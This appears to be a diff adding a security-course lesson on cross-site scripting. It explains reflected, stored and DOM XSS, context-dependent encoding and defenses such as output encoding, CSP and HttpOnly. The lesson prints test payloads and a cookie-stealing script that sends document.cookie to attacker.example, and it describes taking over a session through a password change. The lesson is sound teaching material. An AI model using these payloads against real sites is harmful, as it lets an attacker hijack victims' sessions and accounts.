@@ -1,0 +1,140 @@
+---
+title: Cross-Site Scripting
+module: web-application-attacks
+moduleTitle: Web Application Attacks
+moduleOrder: 15
+moduleIcon: Crosshair
+order: 2
+summary: "Cross-site scripting is your JavaScript running in someone else's browser session. That is the whole attack."
+estimatedMinutes: 18
+objectives:
+  - Tell reflected, stored, and DOM XSS apart by where the payload lives
+  - Explain why the browser cannot tell an attacker's script from the app's own
+  - Trace why output context (HTML, attribute, or JavaScript) decides the payload
+  - Describe the real impact past an alert box, and the defenses that stop it
+prerequisites:
+  - sql-injection
+tags:
+  - web
+  - xss
+  - javascript
+  - client-side
+---
+
+The alert box is a party trick. What cross-site scripting actually buys an attacker is code execution inside another user's browser, running with that user's session, their cookies, and their logged-in privileges. If an attacker can make a victim's browser run attacker-supplied JavaScript on the target site, that script can read the session token, submit forms as the victim, or rewrite the page to phish a password. That is why XSS sits near the top of every bug bounty payout table, and why it has lived on the OWASP list for two decades.
+
+Cross-site scripting happens when an application takes input and places it into a page without encoding it first. A browser parses whatever HTML the server sends. It has no way to know that one `<script>` was written by the developer and another was smuggled in through a comment field, so it runs both with equal trust. The whole vulnerability is that missing distinction between data and code.
+
+There are three flavors, and the split is about one question: where does the payload live, and how does it reach the victim.
+
+## Reflected: the payload rides the request
+
+Reflected XSS bounces input straight back in the same response. A search box that echoes `You searched for: <term>` without encoding is the classic case. The payload lives in the URL, so exploitation is a delivery problem: an attacker crafts a link, gets a victim to click it, and the victim's own request carries the payload into the page.
+
+Because it needs a click, reflected XSS is rated below stored XSS, but it is far from harmless. A convincing link in a phishing email, a shortened URL in a chat, or an ad that redirects through the vulnerable parameter all deliver it at scale. The fix is the same everywhere: encode the value for the context it lands in before writing it back.
+
+Finding it starts with fingerprinting where input lands in the response. An attacker sends a unique marker, locates it in the returned HTML, and checks whether the characters around it were escaped or left raw.
+
+<CommandBlock
+  title="probe the reflection"
+  commands={[
+    { cmd: "?q=xss7331probe", comment: "send a marker, then view source and search for it" },
+    { cmd: "?q=<b>xss7331</b>", comment: "does it render bold, or print the literal tags?" },
+    { cmd: "?q=<script>alert(document.domain)</script>", comment: "confirm execution; document.domain proves the origin" },
+  ]}
+/>
+
+`alert(document.domain)` is a better proof than `alert(1)` because it prints which origin the script is running in. That matters when a payload is bouncing through iframes or subdomains and the tester needs to know exactly whose security context executed the code.
+
+<Quiz
+  id="xss-what-makes-it-possible"
+  question="At its core, what makes a page vulnerable to cross-site scripting?"
+  answer={1}
+  options={[
+    "The server runs an outdated version of JavaScript",
+    "User input is placed into the page without encoding, so the browser parses it as code",
+    "The site uses HTTP instead of HTTPS",
+    "The database stores passwords in plain text",
+  ]}
+  explanation="XSS is a failure to separate data from code. When untrusted input is written into a page without context-appropriate encoding, the browser cannot tell the attacker's markup from the developer's, and runs both."
+/>
+
+## Stored: the payload waits for victims
+
+Stored XSS is the dangerous one. The payload is saved server-side, in a comment, a profile bio, a product review, or a support ticket, and then fires for every user who loads the page that displays it. There is no link to send and no social engineering step. The administrator who opens the malicious support ticket runs the attacker's JavaScript automatically, just by viewing it.
+
+That is why a stored XSS in an admin panel is often a straight line to account takeover. The attacker plants the payload, an administrator with a privileged session views it, and that session token is exfiltrated to a server the attacker controls.
+
+Stored XSS can also spread on its own. In 2005 a payload on a MySpace profile added the author as a friend and copied itself onto every profile that viewed it, reaching a million accounts in under a day. The mechanism was ordinary stored XSS. The lesson is that a payload which runs for every viewer does not need a click to reach scale, it only needs a page that enough people load.
+
+The guestbook below is a real, safe example of stored XSS, running in an isolated sandbox in your browser. It saves each comment straight into the page as HTML, which is the actual bug. The panel beside it shows exactly what the app inserts, so it is clear why the payload works. One quirk worth knowing: a raw `<script>` tag added through `innerHTML` does not execute, so the payload uses an element with an event handler instead, like `<img src=x onerror=alert(1)>`. The broken image fails to load, which fires its `onerror` handler, which runs the code.
+
+<XssLab />
+
+<Callout type="security" title="Authorized targets only">
+Test XSS against your own lab: DVWA, the PortSwigger Web Security Academy XSS labs, or a Juice Shop instance you spun up. Firing a real cookie-stealer at a live site's users is illegal and hits real people. Keep payloads pointed at a listener you control, on a target you are cleared to test.
+</Callout>
+
+## DOM XSS: the server never sees it
+
+DOM-based XSS lives entirely in client-side JavaScript. The vulnerable code reads from a source it does not trust, like `location.hash` or `document.referrer`, and writes it into a dangerous sink like `innerHTML`, `document.write`, or `eval`, all inside the browser. The payload may never reach the server at all, which means server-side logs and a web application firewall never see it. It is found by reading the JavaScript and tracing data from source to sink.
+
+A concrete shape shows up constantly. A page reads the fragment after the `#` in the URL to decide which tab to show, then writes that value into the page to render a heading. The source is `location.hash`, the sink is `innerHTML`, and a link ending in `#<img src=x onerror=alert(1)>` fires the moment the page loads, with no server round trip. Single-page applications made this common: routing, templating, and rendering all happen in the browser, so a growing share of untrusted data flows through client-side code that the server never inspects.
+
+Because the flaw is in the page's own script, the same output-encoding rule applies, but the fix moves client-side: use safe sinks like `textContent` or `setAttribute` instead of `innerHTML`, and never pass untrusted strings to `eval`. Framework rendering helps here too, since binding a value as text rather than raw HTML encodes it by default.
+
+## Context decides the payload
+
+The single most useful idea for writing working XSS is that encoding is context-dependent. The same input is safe in one place and a live vulnerability three characters over. Where the value lands determines both whether it fires and what payload is needed.
+
+- In an HTML body, `<script>` or an event-handler tag runs. The defense is HTML-entity encoding, turning `<` into `&lt;`.
+- Inside an HTML attribute, breaking out of the quotes is the move, so `" onmouseover="alert(1)` closes the attribute and adds a new one. The defense is attribute encoding plus consistent quoting.
+- Inside an existing `<script>` block or an inline event handler, the input is already in a JavaScript context, so no tags are needed at all, just valid JavaScript. The defense is JavaScript-string encoding, not HTML encoding.
+
+A developer who HTML-encodes everything and assumes they are safe still gets popped when their value is written into a URL or a JavaScript string, because that context needed a different encoding. Matching the encoder to the sink is the whole defense.
+
+<Quiz
+  id="xss-dom-vs-reflected"
+  question="A tester reviews a page's JavaScript and finds it reads location.hash and writes it into an element's innerHTML. No parameter is ever sent to the server. What kind of XSS is this?"
+  answer={2}
+  options={[
+    "Reflected, because the payload is in the URL",
+    "Stored, because innerHTML saves the value",
+    "DOM-based, because the untrusted data flows from a client-side source to a client-side sink without the server processing it",
+    "It is not XSS, because the server never sees the input",
+  ]}
+  explanation="When the source and the sink are both in client-side JavaScript and the payload need never touch the server, it is DOM-based XSS. Server logs and WAFs miss it, so it is found by reading the code and tracing source to sink."
+/>
+
+## Impact: past the alert
+
+Swapping the alert for something that matters is a one-line change. The bread-and-butter payload reads the session cookie and ships it to a listener the attacker runs:
+
+<CommandCard command="<script>new Image().src='http://attacker.example/c?='+document.cookie</script>" explain="Loads an image from an attacker-controlled server with the victim's cookie in the query string. The attacker runs a listener and the token shows up in the access log, letting them ride the victim's session." />
+
+One caveat trips people up: cookies flagged `HttpOnly` are invisible to `document.cookie`. When that flag is set, cookie theft is off the table, so the attack pivots. The script uses the XSS to make authenticated requests directly from inside the victim's session, for example reading a CSRF token off the page and submitting a password-change form, instead of trying to exfiltrate a cookie it cannot read. The browser is already logged in, so the script inherits every privilege the user has.
+
+## Defense: encode on output, then add layers
+
+XSS is fixed on output, not input. Trying to strip bad characters on the way in fails because there are too many encodings and too many contexts. The reliable fix is to encode every piece of untrusted data for the exact context it is written into, at the moment it is written, which modern templating engines do automatically as long as the developer does not opt out with a raw-HTML escape hatch.
+
+Two more layers harden what encoding misses. A Content Security Policy tells the browser which script sources to trust, so an injected inline script is refused even if it slips into the page. The `HttpOnly` flag keeps session cookies out of reach of any script that does run, blunting the most common payload. None of these replace output encoding, but together they turn a single missed encode from a full account takeover into a dead end.
+
+<Exercise title="Find the sink">
+Open the guestbook lab above and post a plain comment first, then view what the panel says the app inserts. Now post `<img src=x onerror=alert(1)>` and watch it fire. Ask yourself: which line of the app's code is the sink, and what single change (encoding the value, or using a safe property like textContent) would have stopped your payload while still showing the comment as text?
+</Exercise>
+
+<Quiz
+  id="xss-primary-defense"
+  question="What is the most reliable primary defense against cross-site scripting?"
+  answer={1}
+  options={[
+    "Blocking the word script in user input with a filter",
+    "Encoding untrusted data for the specific context it is written into, on output",
+    "Serving the whole site over HTTPS",
+    "Storing user input in a separate database table",
+  ]}
+  explanation="XSS is fixed on output. Context-appropriate encoding at the moment data is written into the page is the reliable defense; input filtering is bypassable, and a Content Security Policy plus HttpOnly cookies are hardening layers on top, not replacements."
+/>
+
+<Notes />
